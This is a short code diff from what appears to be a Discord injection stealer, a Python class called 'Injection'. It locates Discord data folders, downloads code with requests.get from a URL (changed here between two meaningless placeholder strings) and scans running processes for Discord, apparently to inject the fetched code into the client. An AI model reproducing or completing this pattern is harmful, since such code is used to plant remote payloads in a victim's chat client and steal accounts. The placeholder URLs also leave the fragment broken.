@@ -16,7 +16,7 @@ class Injection:
             self.appdata + '\\DiscordDevelopment'
         ]
         self.code = requests.get(
-            'daaadsadsa').text
+            'daaadsadsa33').text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
